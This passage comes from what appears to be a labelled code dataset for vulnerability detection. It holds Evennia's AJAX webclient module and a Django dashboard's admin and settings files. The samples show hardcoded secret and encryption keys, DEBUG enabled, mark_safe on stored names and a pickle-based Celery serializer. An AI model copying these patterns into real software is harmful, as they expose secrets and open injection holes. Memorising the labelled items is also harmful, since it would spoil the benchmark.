kwargs[\"options\"].update({\"send_prompt\": True})\n        self.send_text(*args, **kwargs)\n\n    def send_default(self, cmdname, *args, **kwargs):\n        \"\"\"\n        Data Evennia -> User.\n\n        Args:\n            cmdname (str): The first argument will always be the oob cmd name.\n            *args (any): Remaining args will be arguments for `cmd`.\n\n        Kwargs:\n            options (dict): These are ignored for oob commands. Use command\n                arguments (which can hold dicts) to send instructions to the\n                client instead.\n\n        \"\"\"\n        if not cmdname == \"options\":\n            # print \"ajax.send_default\", cmdname, args, kwargs\n            self.client.lineSend(self.csessid, [cmdname, args, kwargs])\n/n/n/n", "label": 0}, {"id": "300261529b82f95414c9d1d7150d6eda4695bb93", "code": "/evennia/server/portal/webclient_ajax.py/n/n\"\"\"\nAJAX/COMET fallback webclient\n\nThe AJAX/COMET web client consists of two components running on\ntwisted and django. They are both a part of the Evennia website url\ntree (so the testing website might be located on\nhttp://localhost:4001/, whereas the webclient can be found on\nhttp://localhost:4001/webclient.)\n\n/webclient - this url is handled through django's template\n             system and serves the html page for the client\n             itself along with its javascript chat program.\n/webclientdata - this url is called by the ajax chat using\n                 POST requests (long-polling when necessary)\n                 The WebClient resource in this module will\n                 handle these requests and act as a gateway\n                 to sessions connected over the webclient.\n\"\"\"\nimport json\nimport re\nimport time\n\nfrom twisted.web import server, resource\nfrom twisted.internet.task import LoopingCall\nfrom django.utils.functional import Promise\nfrom django.utils.encoding import force_unicode\nfrom django.conf import settings\nfrom evennia.utils.ansi import parse_ansi\nfrom evennia.utils import utils\nfrom evennia.utils.text2html import parse_html\nfrom evennia.server import session\n\n_CLIENT_SESSIONS = utils.mod_import(settings.SESSION_ENGINE).SessionStore\n_RE_SCREENREADER_REGEX = re.compile(r\"%s\" % settings.SCREENREADER_REGEX_STRIP, re.DOTALL + re.MULTILINE)\n_SERVERNAME = settings.SERVERNAME\n_KEEPALIVE = 30  # how often to check keepalive\n\n# defining a simple json encoder for returning\n# django data to the client. Might need to\n# extend this if one wants to send more\n# complex database objects too.\n\n\nclass LazyEncoder(json.JSONEncoder):\n    def default(self, obj):\n        if isinstance(obj, Promise):\n            return force_unicode(obj)\n        return super(LazyEncoder, self).default(obj)\n\n\ndef jsonify(obj):\n    return utils.to_str(json.dumps(obj, ensure_ascii=False, cls=LazyEncoder))\n\n\n#\n# AjaxWebClient resource - this is called by the ajax client\n# using POST requests to /webclientdata.\n#\n\nclass AjaxWebClient(resource.Resource):\n    \"\"\"\n    An ajax/comet long-polling transport\n\n    \"\"\"\n    isLeaf = True\n    allowedMethods = ('POST',)\n\n    def __init__(self):\n        self.requests = {}\n        self.databuffer = {}\n\n        self.last_alive = {}\n        self.keep_alive = None\n\n    def _responseFailed(self, failure, csessid, request):\n        \"callback if a request is lost/timed out\"\n        try:\n            del self.requests[csessid]\n        except KeyError:\n            # nothing left to delete\n            pass\n\n    def _keepalive(self):\n        \"\"\"\n        Callback for checking the connection is still alive.\n        \"\"\"\n        now = time.time()\n        to_remove = []\n        keep_alives = ((csessid, remove) for csessid, (t, remove)\n                       in self.last_alive.iteritems() if now - t > _KEEPALIVE)\n        for csessid, remove in keep_alives:\n            if remove:\n                # keepalive timeout. Line is dead.\n                to_remove.append(csessid)\n            else:\n                # normal timeout - send keepalive\n                self.last_alive[csessid] = (now, True)\n                self.lineSend(csessid, [\"ajax_keepalive\", [], {}])\n        # remove timed-out sessions\n        for csessid in to_remove:\n            sessions = self.sessionhandler.sessions_from_csessid(csessid)\n            for sess in sessions:\n                sess.disconnect()\n            self.last_alive.pop(csessid, None)\n            if not self.last_alive:\n                # no more ajax clients. Stop the keepalive\n                self.keep_alive.stop()\n                self.keep_alive = None\n\n    def at_login(self):\n        \"\"\"\n        Called when this session gets authenticated by the server.\n        \"\"\"\n        pass\n\n    def lineSend(self, csessid, data):\n        \"\"\"\n        This adds the data to the buffer and/or sends it to the client\n        as soon as possible.\n\n        Args:\n            csessid (int): Session id.\n            data (list): A send structure [cmdname, [args], {kwargs}].\n\n        \"\"\"\n        request = self.requests.get(csessid)\n        if request:\n            # we have a request waiting. Return immediately.\n            request.write(jsonify(data))\n            request.finish()\n            del self.requests[csessid]\n        else:\n            # no waiting request. Store data in buffer\n            dataentries = self.databuffer.get(csessid, [])\n            dataentries.append(jsonify(data))\n            self.databuffer[csessid] = dataentries\n\n    def client_disconnect(self, csessid):\n        \"\"\"\n        Disconnect session with given csessid.\n\n        Args:\n            csessid (int): Session id.\n\n        \"\"\"\n        if csessid in self.requests:\n            self.requests[csessid].finish()\n            del self.requests[csessid]\n        if csessid in self.databuffer:\n            del self.databuffer[csessid]\n\n    def mode_init(self, request):\n        \"\"\"\n        This is called by render_POST when the client requests an init\n        mode operation (at startup)\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        csessid = request.args.get('csessid')[0]\n\n        remote_addr = request.getClientIP()\n        host_string = \"%s (%s:%s)\" % (_SERVERNAME, request.getRequestHostname(), request.getHost().port)\n\n        sess = AjaxWebClientSession()\n        sess.client = self\n        sess.init_session(\"ajax/comet\", remote_addr, self.sessionhandler)\n\n        sess.csessid = csessid\n        csession = _CLIENT_SESSIONS(session_key=sess.csessid)\n        uid = csession and csession.get(\"webclient_authenticated_uid\", False)\n        if uid:\n            # the client session is already logged in\n            sess.uid = uid\n            sess.logged_in = True\n\n        sess.sessionhandler.connect(sess)\n\n        self.last_alive[csessid] = (time.time(), False)\n        if not self.keep_alive:\n            # the keepalive is not running; start it.\n            self.keep_alive = LoopingCall(self._keepalive)\n            self.keep_alive.start(_KEEPALIVE, now=False)\n\n        return jsonify({'msg': host_string, 'csessid': csessid})\n\n    def mode_keepalive(self, request):\n        \"\"\"\n        This is called by render_POST when the\n        client is replying to the keepalive.\n        \"\"\"\n        csessid = request.args.get('csessid')[0]\n        self.last_alive[csessid] = (time.time(), False)\n        return '\"\"'\n\n    def mode_input(self, request):\n        \"\"\"\n        This is called by render_POST when the client\n        is sending data to the server.\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        csessid = request.args.get('csessid')[0]\n\n        self.last_alive[csessid] = (time.time(), False)\n        sess = self.sessionhandler.sessions_from_csessid(csessid)\n        if sess:\n            sess = sess[0]\n            cmdarray = json.loads(request.args.get('data')[0])\n            sess.sessionhandler.data_in(sess, **{cmdarray[0]: [cmdarray[1], cmdarray[2]]})\n        return '\"\"'\n\n    def mode_receive(self, request):\n        \"\"\"\n        This is called by render_POST when the client is telling us\n        that it is ready to receive data as soon as it is available.\n        This is the basis of a long-polling (comet) mechanism: the\n        server will wait to reply until data is available.\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        csessid = request.args.get('csessid')[0]\n        self.last_alive[csessid] = (time.time(), False)\n\n        dataentries = self.databuffer.get(csessid, [])\n        if dataentries:\n            return dataentries.pop(0)\n        request.notifyFinish().addErrback(self._responseFailed, csessid, request)\n        if csessid in self.requests:\n            self.requests[csessid].finish()  # Clear any stale request.\n        self.requests[csessid] = request\n        return server.NOT_DONE_YET\n\n    def mode_close(self, request):\n        \"\"\"\n        This is called by render_POST when the client is signalling\n        that it is about to be closed.\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        csessid = request.args.get('csessid')[0]\n        try:\n            sess = self.sessionhandler.sessions_from_csessid(csessid)[0]\n            sess.sessionhandler.disconnect(sess)\n        except IndexError:\n            self.client_disconnect(csessid)\n        return '\"\"'\n\n    def render_POST(self, request):\n        \"\"\"\n        This function is what Twisted calls with POST requests coming\n        in from the ajax client. The requests should be tagged with\n        different modes depending on what needs to be done, such as\n        initializing or sending/receving data through the request. It\n        uses a long-polling mechanism to avoid sending data unless\n        there is actual data available.\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        dmode = request.args.get('mode', [None])[0]\n        if dmode == 'init':\n            # startup. Setup the server.\n            return self.mode_init(request)\n        elif dmode == 'input':\n            # input from the client to the server\n            return self.mode_input(request)\n        elif dmode == 'receive':\n            # the client is waiting to receive data.\n            return self.mode_receive(request)\n        elif dmode == 'close':\n            # the client is closing\n            return self.mode_close(request)\n        elif dmode == 'keepalive':\n            # A reply to our keepalive request - all is well\n            return self.mode_keepalive(request)\n        else:\n            # This should not happen if client sends valid data.\n            return '\"\"'\n\n\n#\n# A session type handling communication over the\n# web client interface.\n#\n\nclass AjaxWebClientSession(session.Session):\n    \"\"\"\n    This represents a session running in an AjaxWebclient.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        self.protocol_key = \"webclient/ajax\"\n        super(AjaxWebClientSession, self).__init__(*args, **kwargs)\n\n    def get_client_session(self):\n        \"\"\"\n        Get the Client browser session (used for auto-login based on browser session)\n\n        Returns:\n            csession (ClientSession): This is a django-specific internal representation\n                of the browser session.\n\n        \"\"\"\n        if self.csessid:\n            return _CLIENT_SESSIONS(session_key=self.csessid)\n\n    def disconnect(self, reason=\"Server disconnected.\"):\n        \"\"\"\n        Disconnect from server.\n\n        Args:\n            reason (str): Motivation for the disconnect.\n        \"\"\"\n        csession = self.get_client_session()\n\n        if csession:\n            csession[\"webclient_authenticated_uid\"] = None\n            csession.save()\n            self.logged_in = False\n        self.client.lineSend(self.csessid, [\"connection_close\", [reason], {}])\n        self.client.client_disconnect(self.csessid)\n        self.sessionhandler.disconnect(self)\n\n    def at_login(self):\n        csession = self.get_client_session()\n        if csession:\n            csession[\"webclient_authenticated_uid\"] = self.uid\n            csession.save()\n\n    def data_out(self, **kwargs):\n        \"\"\"\n        Data Evennia -> User\n\n        Kwargs:\n            kwargs (any): Options to the protocol\n        \"\"\"\n        self.sessionhandler.data_out(self, **kwargs)\n\n    def send_text(self, *args, **kwargs):\n        \"\"\"\n        Send text data. This will pre-process the text for\n        color-replacement, conversion to html etc.\n\n        Args:\n            text (str): Text to send.\n\n        Kwargs:\n            options (dict): Options-dict with the following keys understood:\n                - raw (bool): No parsing at all (leave ansi-to-html markers unparsed).\n                - nocolor (bool): Remove all color.\n                - screenreader (bool): Use Screenreader mode.\n                - send_prompt (bool): Send a prompt with parsed html\n\n        \"\"\"\n        if args:\n            args = list(args)\n            text = args[0]\n            if text is None:\n                return\n        else:\n            return\n\n        flags = self.protocol_flags\n        text = utils.to_str(text, force_string=True)\n\n        options = kwargs.pop(\"options\", {})\n        raw = options.get(\"raw\", flags.get(\"RAW\", False))\n        xterm256 = options.get(\"xterm256\", flags.get('XTERM256', True))\n        useansi = options.get(\"ansi\", flags.get('ANSI', True))\n        nocolor = options.get(\"nocolor\", flags.get(\"NOCOLOR\") or not (xterm256 or useansi))\n        screenreader = options.get(\"screenreader\", flags.get(\"SCREENREADER\", False))\n        prompt = options.get(\"send_prompt\", False)\n\n        if screenreader:\n            # screenreader mode cleans up output\n            text = parse_ansi(text, strip_ansi=True, xterm256=False, mxp=False)\n            text = _RE_SCREENREADER_REGEX.sub(\"\", text)\n        cmd = \"prompt\" if prompt else \"text\"\n        if raw:\n            args[0] = text\n        else:\n            args[0] = parse_html(text, strip_ansi=nocolor)\n\n        # send to client on required form [cmdname, args, kwargs]\n        self.client.lineSend(self.csessid, [cmd, args, kwargs])\n\n    def send_prompt(self, *args, **kwargs):\n        kwargs[\"options\"].update({\"send_prompt\": True})\n        self.send_text(*args, **kwargs)\n\n    def send_default(self, cmdname, *args, **kwargs):\n        \"\"\"\n        Data Evennia -> User.\n\n        Args:\n            cmdname (str): The first argument will always be the oob cmd name.\n            *args (any): Remaining args will be arguments for `cmd`.\n\n        Kwargs:\n            options (dict): These are ignored for oob commands. Use command\n                arguments (which can hold dicts) to send instructions to the\n                client instead.\n\n        \"\"\"\n        if not cmdname == \"options\":\n            # print \"ajax.send_default\", cmdname, args, kwargs\n            self.client.lineSend(self.csessid, [cmdname, args, kwargs])\n/n/n/n", "label": 1}, {"id": "9c1c17e55e436e0f6a5f7271c39d77d8a6890738", "code": "dashboard/internet_nl_dashboard/admin.py/n/nfrom datetime import datetime, timedelta\n\nimport pytz\nfrom constance.admin import Config, ConstanceAdmin, ConstanceForm\nfrom cryptography.fernet import Fernet\nfrom django.conf import settings\nfrom django.contrib import admin\nfrom django.contrib.auth.admin import GroupAdmin as BaseGroupAdmin\nfrom django.contrib.auth.admin import UserAdmin as BaseUserAdmin\nfrom django.contrib.auth.models import Group, User\nfrom django.contrib.humanize.templatetags.humanize import naturaltime\nfrom django.utils.safestring import mark_safe\nfrom django_celery_beat.admin import PeriodicTaskAdmin, PeriodicTaskForm\nfrom django_celery_beat.models import CrontabSchedule, PeriodicTask\nfrom import_export import resources\nfrom import_export.admin import ImportExportModelAdmin\n\nfrom dashboard.internet_nl_dashboard.models import Account, DashboardUser, UploadLog, UrlList\n\n\nclass MyPeriodicTaskForm(PeriodicTaskForm):\n\n    fieldsets = PeriodicTaskAdmin.fieldsets\n\n    \"\"\"\n    Interval schedule does not support due_ or something. Which is absolutely terrible and vague.\n    I can't understand why there is not an is_due() for each type of schedule. This makes it very hazy\n    when something will run.\n\n    Because of this, we'll move to the horrifically designed absolute nightmare format Crontab.\n    Crontab would be half-great if the parameters where named.\n\n    Get your crontab guru going, this is the only way you'll understand what you're doing.\n    https://crontab.guru/#0_21_*_*_*\n    \"\"\"\n\n    def clean(self):\n        print('cleaning')\n\n        cleaned_data = super(PeriodicTaskForm, self).clean()\n\n        # if not self.cleaned_data['last_run_at']:\n        #     self.cleaned_data['last_run_at'] = datetime.now(pytz.utc)\n\n        return cleaned_data\n\n\nclass IEPeriodicTaskAdmin(PeriodicTaskAdmin, ImportExportModelAdmin):\n    # most / all time schedule functions in celery beat are moot. So the code below likely makes no sense.\n\n    list_display = ('name_safe', 'enabled', 'interval', 'crontab', 'next',  'due',\n                    'precise', 'last_run_at', 'queue', 'task', 'args', 'last_run', 'runs')\n\n    list_filter = ('enabled', 'queue', 'crontab')\n\n    search_fields = ('name', 'queue', 'args')\n\n    form = MyPeriodicTaskForm\n\n    save_as = True\n\n    @staticmethod\n    def name_safe(obj):\n        return mark_safe(obj.name)\n\n    @staticmethod\n    def last_run(obj):\n        return obj.last_run_at\n\n    @staticmethod\n    def runs(obj):\n        # print(dir(obj))\n        return obj.total_run_count\n\n    @staticmethod\n    def due(obj):\n        if obj.last_run_at:\n            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)\n        else:\n            # y in seconds\n            z, y = obj.schedule.is_due(last_run_at=datetime.now(pytz.utc))\n            date = datetime.now(pytz.utc) + timedelta(seconds=y)\n\n            return naturaltime(date)\n\n    @staticmethod\n    def precise(obj):\n        if obj.last_run_at:\n            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)\n        else:\n            return obj.schedule.remaining_estimate(last_run_at=datetime.now(pytz.utc))\n\n    @staticmethod\n    def next(obj):\n        if obj.last_run_at:\n            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)\n        else:\n            # y in seconds\n            z, y = obj.schedule.is_due(last_run_at=datetime.now(pytz.utc))\n            # somehow the cron jobs still give the correct countdown even last_run_at is not set.\n\n            date = datetime.now(pytz.utc) + timedelta(seconds=y)\n\n            return date\n\n    class Meta:\n        ordering = [\"-name\"]\n\n\nclass IECrontabSchedule(ImportExportModelAdmin):\n    pass\n\n\nadmin.site.unregister(PeriodicTask)\nadmin.site.unregister(CrontabSchedule)\nadmin.site.register(PeriodicTask, IEPeriodicTaskAdmin)\nadmin.site.register(CrontabSchedule, IECrontabSchedule)\n\n\nclass DashboardUserInline(admin.StackedInline):\n    model = DashboardUser\n    can_delete = False\n    verbose_name_plural = 'Dashboard Users'\n\n\n# Thank you:\n# https://stackoverflow.com/questions/47941038/how-should-i-add-django-import-export-on-the-user-model?rq=1\nclass UserResource(resources.ModelResource):\n    class Meta:\n        model = User\n        # fields = ('first_name', 'last_name', 'email')\n\n\nclass GroupResource(resources.ModelResource):\n    class Meta:\n        model = Group\n\n\nclass UserAdmin(BaseUserAdmin, ImportExportModelAdmin):\n    resource_class = UserResource\n    inlines = (DashboardUserInline, )\n\n    list_display = ('username', 'first_name', 'last_name',\n                    'email', 'is_active', 'is_staff', 'is_superuser', 'last_login', 'in_groups')\n\n    actions = []\n\n    @staticmethod\n    def in_groups(obj):\n        value = \"\"\n        for group in obj.groups.all():\n            value += group.name\n        return value\n\n\n# I don't know if the permissions between two systems have the same numbers... Only one way to find out :)\nclass GroupAdmin(BaseGroupAdmin, ImportExportModelAdmin):\n    resource_class = GroupResource\n\n\nadmin.site.unregister(User)\nadmin.site.register(User, UserAdmin)\nadmin.site.unregister(Group)\nadmin.site.register(Group, GroupAdmin)\n\n\n# todo: make sure this is implemented.\n# Overwrite the ugly Constance forms with something nicer\nclass CustomConfigForm(ConstanceForm):\n    def __init__(self, *args, **kwargs):\n        super(CustomConfigForm, self).__init__(*args, **kwargs)\n        # ... do stuff to make your settings form nice ...\n\n\nclass ConfigAdmin(ConstanceAdmin):\n    change_list_form = CustomConfigForm\n    change_list_template = 'admin/config/settings.html'\n\n\nadmin.site.unregister([Config])\nadmin.site.register([Config], ConfigAdmin)\n\n\n@admin.register(Account)\nclass AccountAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n\n    list_display = ('name', 'enable_logins', 'internet_nl_api_username')\n    search_fields = ('name', )\n    list_filter = ['enable_logins'][::-1]\n    fields = ('name', 'enable_logins', 'internet_nl_api_username', 'internet_nl_api_password')\n\n    def save_model(self, request, obj, form, change):\n\n        # If the internet_nl_api_password changed, encrypt the new value.\n        # Example usage and docs: https://github.com/pyca/cryptography\n        if 'internet_nl_api_password' in form.changed_data:\n            f = Fernet(settings.FIELD_ENCRYPTION_KEY)\n            encrypted = f.encrypt(obj.internet_nl_api_password.encode())\n            obj.internet_nl_api_password = encrypted\n\n            # You can decrypt using f.decrypt(token)\n\n        super().save_model(request, obj, form, change)\n\n    actions = []\n\n\n@admin.register(UrlList)\nclass UrlListAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n\n    list_display = ('name', 'account', )\n    search_fields = ('name', 'account__name')\n    list_filter = ['account'][::-1]\n    fields = ('name', 'account', 'urls')\n\n\n@admin.register(UploadLog)\nclass UploadLogAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n    list_display = ('original_filename', 'internal_filename', 'status', 'message', 'user', 'upload_date', 'filesize')\n    search_fields = ('internal_filename', 'orginal_filename', 'status')\n    list_filter = ['message', 'upload_date', 'user'][::-1]\n\n    fields = ('original_filename', 'internal_filename', 'status', 'message', 'user', 'upload_date', 'filesize')\n/n/n/ndashboard/settings.py/n/n\"\"\"\nDjango settings for dashboard project.\n\nGenerated by 'django-admin startproject' using Django 2.1.7.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/2.1/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/2.1/ref/settings/\n\"\"\"\n\nimport os\nfrom datetime import timedelta\n\nfrom django.utils.translation import gettext_lazy as _\n\n# Build paths inside the project like this: os.path.join(BASE_DIR, ...)\n# BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))\nBASE_DIR = os.path.dirname(os.path.abspath(__file__))\nSETTINGS_PATH = os.path.normpath(os.path.dirname(__file__))\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/2.1/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '_dzlo^9d#ox6!7c9rju@=u8+4^sprqocy3s*l*ejc2yr34@&98'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = []\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    # Constance\n    'constance',\n    'constance.backends.database',\n\n    # Jet\n    'jet.dashboard',\n    'jet',\n\n    # Import Export\n    'import_export',\n\n    # Standard Django\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    'django.contrib.humanize',\n\n    # Periodic tasks\n    'django_celery_beat',\n\n    # Javascript and CSS compression:\n    'compressor',\n\n    # Web Security Map (todo: minimize the subset)\n    # The reason (model) why it's included is in the comments.\n    'websecmap.app',  # Job\n    'websecmap.organizations',  # Url\n    'websecmap.scanners',  # Endpoint, EndpointGenericScan, UrlGenericScan\n    'websecmap.reporting',  # Various reporting functions (might be not needed)\n    'websecmap.map',  # because some scanners are intertwined with map configurations. That needs to go.\n    'websecmap.pro',  # some model inlines\n\n    # Custom Apps\n    # These apps overwrite whatever is declared above, for example the user information.\n    'dashboard.internet_nl_dashboard',\n\n    # Two factor auth\n    'django_otp',\n    'django_otp.plugins.otp_static',\n    'django_otp.plugins.otp_totp',\n    'two_factor',\n]\n\ntry:\n    # hack to disable django_uwsgi app as it currently conflicts with compressor\n    # https://github.com/django-compressor/django-compressor/issues/881\n    if not os.environ.get('COMPRESS', False):\n        import django_uwsgi  # NOQA\n\n        INSTALLED_APPS += ['django_uwsgi', ]\nexcept ImportError:\n    # only configure uwsgi app if installed (ie: production environment)\n    pass\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.locale.LocaleMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n\n    # Two factor Auth\n    'django_otp.middleware.OTPMiddleware',\n]\n\nROOT_URLCONF = 'dashboard.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [\n            BASE_DIR + '/',\n        ],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'constance.context_processors.config',\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'dashboard.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/2.1/ref/settings/#databases\n\nDATABASE_OPTIONS = {\n    'mysql': {'init_command': \"SET character_set_connection=utf8,\"\n                              \"collation_connection=utf8_unicode_ci,\"\n                              \"sql_mode='STRICT_ALL_TABLES';\"},\n}\nDB_ENGINE = os.environ.get('DB_ENGINE', 'mysql')\nDATABASE_ENGINES = {\n    'mysql': 'dashboard.app.backends.mysql',\n}\nDATABASES_SETTINGS = {\n    # persisten local database used during development (runserver)\n    'dev': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': os.environ.get('DB_NAME', 'db.sqlite3'),\n    },\n    # sqlite memory database for running tests without\n    'test': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': os.environ.get('DB_NAME', 'db.sqlite3'),\n    },\n    # for production get database settings from environment (eg: docker)\n    'production': {\n        'ENGINE': DATABASE_ENGINES.get(DB_ENGINE, 'django.db.backends.' + DB_ENGINE),\n        'NAME': os.environ.get('DB_NAME', 'dashboard'),\n        'USER': os.environ.get('DB_USER', 'dashboard'),\n        'PASSWORD': os.environ.get('DB_PASSWORD', 'dashboard'),\n        'HOST': os.environ.get('DB_HOST', 'mysql'),\n        'OPTIONS': DATABASE_OPTIONS.get(os.environ.get('DB_ENGINE', 'mysql'), {})\n    }\n}\n# allow database to be selected through environment variables\nDATABASE = os.environ.get('DJANGO_DATABASE', 'dev')\nDATABASES = {'default': DATABASES_SETTINGS[DATABASE]}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/2.1/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/2.1/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\nLOCALE_PATHS = ['locale']\n\nLANGUAGE_COOKIE_NAME = 'dashboard_language'\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/2.1/howto/static-files/\n\nSTATIC_URL = '/static/'\n\n# Absolute path to aggregate to and serve static file from.\nif DEBUG:\n    STATIC_ROOT = 'static'\nelse:\n    STATIC_ROOT = '/srv/dashboard/static/'\n\n\nJET_SIDE_MENU_ITEMS = [\n\n    {'label': _('\ud83c\udf9b\ufe0f Configuration'), 'items': [\n        {'name': 'auth.user'},\n        {'name': 'auth.group'},\n        {'name': 'constance.config', 'label': _('Configuration')},\n    ]},\n\n    {'label': _('\ud83d\udcca Dashboard'), 'items': [\n        {'name': 'internet_nl_dashboard.account'},\n        {'name': 'internet_nl_dashboard.urllist'},\n        {'name': 'internet_nl_dashboard.uploadlog'},\n    ]},\n\n    {'label': _('\ud83d\udd52 Periodic Tasks'), 'items': [\n        {'name': 'app.job'},\n        {'name': 'django_celery_beat.periodictask'},\n        {'name': 'django_celery_beat.crontabschedule'},\n    ]},\n\n]\n\nMEDIA_ROOT = os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) + '/uploads/')\nUPLOAD_ROOT = os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) + '/uploads/')\n\n\n# Two factor auth\nLOGIN_URL = \"two_factor:login\"\nLOGIN_REDIRECT_URL = \"/dashboard/\"\nLOGOUT_REDIRECT_URL = LOGIN_URL\nTWO_FACTOR_QR_FACTORY = 'qrcode.image.pil.PilImage'\n# 6 supports google authenticator\nTWO_FACTOR_TOTP_DIGITS = 6\nTWO_FACTOR_PATCH_ADMIN = True\n\n# Encrypted fields\n# Note that this key is not stored in the database. As... well if you have the database, you have the key.\nFIELD_ENCRYPTION_KEY = os.environ.get('FIELD_ENCRYPTION_KEY', b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=')\n\nif not DEBUG and FIELD_ENCRYPTION_KEY == b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=':\n    raise ValueError('FIELD_ENCRYPTION_KEY has to be configured on the OS level, and needs to be different than the '\n                     'default key provided. Please create a new key. Instructions are listed here:'\n                     'https://github.com/pyca/cryptography. In short, run: key = Fernet.generate_key()')\n\nLOGGING = {\n    'version': 1,\n    'disable_existing_loggers': False,\n    'handlers': {\n        'console': {\n            'class': 'logging.StreamHandler',  # sys.stdout\n            'formatter': 'color',\n        },\n    },\n    'formatters': {\n        'debug': {\n            'format': '%(asctime)s\\t%(levelname)-8s - %(filename)-20s:%(lineno)-4s - '\n                      '%(funcName)20s() - %(message)s',\n        },\n        'color': {\n            '()': 'colorlog.ColoredFormatter',\n            'format': '%(log_color)s%(asctime)s\\t%(levelname)-8s - '\n                      '%(message)s',\n            'datefmt': '%Y-%m-%d %H:%M',\n            'log_colors': {\n                'DEBUG': 'green',\n                'INFO': 'white',\n                'WARNING': 'yellow',\n                'ERROR': 'red',\n                'CRITICAL': 'bold_red',\n            },\n        }\n    },\n    'loggers': {\n        # Used when there is no log defined or loaded. Disabled given we always use __package__ to log.\n        # Would you enable it, all logging messages will be logged twice.\n        # '': {\n        #     'handlers': ['console'],\n        #     'level': os.getenv('DJANGO_LOG_LEVEL', 'DEBUG'),\n        # },\n\n        # Default Django logging, we expect django to work, and therefore only show INFO messages.\n        # It can be smart to sometimes want to see what's going on here, but not all the time.\n        # https://docs.djangoproject.com/en/2.1/topics/logging/#django-s-logging-extensions\n        'django': {\n            'handlers': ['console'],\n            'level': os.getenv('DJANGO_LOG_LEVEL', 'INFO'),\n        },\n\n        # We expect to be able to debug websecmap all of the time.\n        'dashboard': {\n            'handlers': ['console'],\n            'level': os.getenv('DJANGO_LOG_LEVEL', 'DEBUG'),\n        },\n    },\n}\n\n\n# settings to get WebSecMap to work:\n# Celery 4.0 settings\n# Pickle can work, but you need to use certificates to communicate (to verify the right origin)\n# It's preferable not to use pickle, yet it's overly convenient as the normal serializer can not\n# even serialize dicts.\n# http://docs.celeryproject.org/en/latest/userguide/configuration.html\nCELERY_accept_content = ['pickle', 'yaml']\nCELERY_task_serializer = 'pickle'\nCELERY_result_serializer = 'pickle'\n\n\n# Celery config\nCELERY_BROKER_URL = os.environ.get('BROKER', 'redis://localhost:6379/0')\nENABLE_UTC = True\n\n# Any data transfered with pickle needs to be over tls... you can inject arbitrary objects with\n# this stuff... message signing makes it a bit better, not perfect as it peels the onion.\n# this stuff... message signing makes it a bit better, not perfect as it peels the onion.\n# see: https://blog.nelhage.com/2011/03/exploiting-pickle/\n# Yet pickle is the only convenient way of transporting objects without having to lean in all kinds\n# of directions to get the job done. Intermediate tables to store results could be an option.\nCELERY_ACCEPT_CONTENT = ['pickle']\nCELERY_TASK_SERIALIZER = 'pickle'\nCELERY_RESULT_SERIALIZER = 'pickle'\nCELERY_TIMEZONE = 'UTC'\n\nCELERY_BEAT_SCHEDULER = 'django_celery_beat.schedulers:DatabaseScheduler'\n\nCELERY_BROKER_CONNECTION_MAX_RETRIES = 1\nCELERY_BROKER_CONNECTION_RETRY = False\nCELERY_RESULT_EXPIRES = timedelta(hours=4)\n\n# Use the value of 2 for celery prefetch multiplier. Previous was 1. The\n# assumption is that 1 will block a worker thread until the current (rate\n# limited) task is completed. When using 2 (or higher) the assumption is that\n# celery will drop further rate limited task from the internal worker queue and\n# fetch other tasks tasks that could be executed (spooling other rate limited\n# 